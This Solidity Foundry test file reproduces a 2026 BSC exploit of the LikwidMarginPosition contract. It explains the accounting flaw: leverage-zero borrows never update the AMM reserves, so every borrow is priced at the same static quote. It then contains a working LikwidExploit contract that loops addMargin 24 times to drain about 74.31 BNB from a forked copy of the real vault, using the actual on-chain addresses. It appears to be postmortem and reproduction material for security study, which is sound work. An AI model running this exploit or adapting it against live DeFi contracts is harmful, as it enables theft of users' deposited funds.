// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Likwid (LikwidMarginPosition) oracle/accounting exploit - BSC, 2026-09-18.
//
// Loss: 74.31 BNB drained from LikwidVault.
//
// On-chain references (BSC):
//   attack tx        : 0x83cbd07d59aedc2f114c351c568d3386ff5bc7caa87d12bc6494e2dc7bf16f4d
//   block            : 122525331 (fork at parent 122525330)
//   attacker EOA     : 0x90bde1e0Bb16B3DEEb9d638aCf8D01F19fD2F31e
//   attacker contract: 0xC63FB27F52ed8d06673c60c3075B2D3bD26Cf4AA (pre-held 218.58M TOKEN)
//
// Actors / contracts:
//   LikwidMarginPosition (vulnerable) : 0x6bec0c1dc4898484b7f094566ddf8bc82ed7abe8
//   LikwidVault (victim, holds BNB)   : 0x065d449ec9D139740343990B7E1CF05fA830e4Ba
//   TOKEN (currency1, "Likwid", proxy): 0x0f12d5048a6bed7ECc572fa7805D03Af7B5FB9d2
//   pool: currency0 = BNB (address(0)), currency1 = TOKEN, fee 3000, marginFee 2500
//
// ROOT CAUSE (confirmed against the deployed verified source, contract "LikwidMarginPosition"):
//   _margin() routes leverage==0 to _executeAddCollateralAndBorrow(). That function sets
//   delta.lendDelta, delta.mirrorDelta and delta.marginDelta but NEVER sets delta.pairDelta
//   (compare _executeAddLeverage, which sets `delta.pairDelta = toBalanceDelta(...)`). pairDelta
//   is the only field that feeds back into the AMM pairReserves through the unlock callback, so a
//   leverage==0 borrow leaves pairReserves untouched. The very first line of the same function,
//   SwapMath.getAmountOut(poolState.pairReserves, ...), therefore returns the exact same quote on
//   every call because the reserves it reads never move. The attacker repeated addMargin(...) with
//   marginForOne=true, leverage=0, borrowAmount=type(uint256).max, settling 211.8M TOKEN at the
//   first-trade marginal price with zero AMM price impact.
//
//   addMargin is `external payable` with no admin/signer gate. _margin -> _requireAuth only checks
//   the caller owns the position NFT it just minted for itself, so the path is fully unprivileged.
//
//   Verified from the attack tx trace: 24 successful addMargin calls. The first 15 each borrowed an
//   identical 4.787036565860255800 BNB (the static-reserve quote - the bug), then the borrow tapers
//   only because borrowMaxAmount is also capped at 20% of the shrinking realReserves, never because
//   the marginal price moved. Total: 211,832,397.21 TOKEN in, 74.310377810 BNB out.
//
// This is one self-contained tx. The 218.58M TOKEN was pre-held by the attacker contract well
// before the block (present since >=122525300), so it is genuine pre-state, not same-block setup;
// the PoC funds its own exploit contract from that real pre-held balance and then runs the real
// repeated addMargin cycle.
//
// Run (bsc alias in foundry.toml is binance.llamarpc.com, currently NXDOMAIN, and non-archival
// anyway). Use an archival BSC endpoint without editing foundry.toml:
//   BSC_RPC=https://bsc-mainnet.public.blastapi.io \
//     forge test --contracts src/test/2026-09/Likwid_exp.sol -vvv

interface ILikwidMarginPosition {
    struct PoolKey {
        address currency0;
        address currency1;
        uint24 fee;
        uint24 marginFee;
    }

    struct CreateParams {
        bool marginForOne;
        uint24 leverage;
        uint256 marginAmount;
        uint256 borrowAmount;
        uint256 borrowAmountMax;
        address recipient;
        uint256 deadline;
    }

    function addMargin(PoolKey calldata key, CreateParams calldata params)
        external
        payable
        returns (uint256 tokenId, uint256 borrowAmount, uint256 swapFeeAmount);
}

contract LikwidExploit {
    ILikwidMarginPosition constant MP = ILikwidMarginPosition(0x6bec0c1dc4898484b7F094566ddf8bC82ED7Abe8);
    IERC20 constant TOKEN = IERC20(0x0f12d5048a6bed7ECc572fa7805D03Af7B5FB9d2);
    address constant BNB = address(0);

    address immutable owner;

    // Exact per-call marginAmounts of the 24 successful addMargin calls in the real tx, in order.
    // 15x 13.66M TOKEN (each borrowing the identical 4.7857 BNB static quote), then tapering as the
    // 20%-of-realReserves cap bites. Sum = 211,832,397.21 TOKEN.
    function _margins() internal pure returns (uint256[24] memory m) {
        uint256 a = 13661559550241944241919791;
        for (uint256 i = 0; i < 15; i++) m[i] = a;
        m[15] = 6830779775120972120959895;
        m[16] = 53365466993132594694999;
        m[17] = 13341366748283148673749;
        m[18] = 6670683374141574336874;
        m[19] = 3335341687070787168437;
        m[20] = 833835421767696792109;
        m[21] = 416917710883848396054;
        m[22] = 208458855441924198027;
        m[23] = 52114713860481049506;
    }

    constructor() {
        owner = msg.sender;
    }

    function run() external {
        // Approve the margin token to the position manager, which pulls it via safeTransferFrom.
        TOKEN.approve(address(MP), type(uint256).max);

        ILikwidMarginPosition.PoolKey memory key = ILikwidMarginPosition.PoolKey({
            currency0: BNB,
            currency1: address(TOKEN),
            fee: 3000,
            marginFee: 2500
        });

        uint256[24] memory margins = _margins();
        for (uint256 i = 0; i < margins.length; i++) {
            MP.addMargin(
                key,
                ILikwidMarginPosition.CreateParams({
                    marginForOne: true,          // margin = currency1 (TOKEN), borrow currency0 (BNB)
                    leverage: 0,                 // the vulnerable leverage==0 branch
                    marginAmount: margins[i],
                    borrowAmount: type(uint256).max, // "borrow the maximum" -> contract sets it to the static quote
                    borrowAmountMax: 0,
                    recipient: address(this),
                    deadline: block.timestamp + 1000
                })
            );
        }

        // Forward the drained BNB to the caller (the test contract).
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    // LikwidVault.take() pays out BNB via a raw call to the recipient.
    receive() external payable {}
}

contract LikwidExp is BaseTestWithBalanceLog {
    IERC20 constant TOKEN = IERC20(0x0f12d5048a6bed7ECc572fa7805D03Af7B5FB9d2);
    address constant ATTACKER_CONTRACT = 0xC63FB27F52ed8d06673c60c3075B2D3bD26Cf4AA; // pre-held TOKEN

    function setUp() public {
        // bsc alias in foundry.toml (binance.llamarpc.com) is dead + non-archival; allow a
        // BSC_RPC env override to an archival node without touching foundry.toml.
        try vm.envString("BSC_RPC") returns (string memory url) {
            vm.createSelectFork(url, 122_525_330);
        } catch {
            vm.createSelectFork("bsc", 122_525_330);
        }
        fundingToken = address(0); // measure profit in native BNB
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public balanceLog {
        LikwidExploit exploit = new LikwidExploit();

        // Fund the exploit contract from the attacker's genuine pre-held TOKEN inventory
        // (present in real pre-state at the fork block). No deal(), no minting.
        uint256 preheld = TOKEN.balanceOf(ATTACKER_CONTRACT);
        vm.prank(ATTACKER_CONTRACT);
        TOKEN.transfer(address(exploit), preheld);

        uint256 bnbBefore = address(this).balance;
        exploit.run();
        uint256 gained = address(this).balance - bnbBefore;

        emit log_named_decimal_uint("BNB drained from LikwidVault", gained, 18);

        // Reported loss ~74.31 BNB; real tx extracted 74.310377810 BNB across 24 addMargin calls.
        assertApproxEqAbs(gained, 74.310377810e18, 0.01e18, "BNB gain != ~74.31");
    }

    receive() external payable {}
}
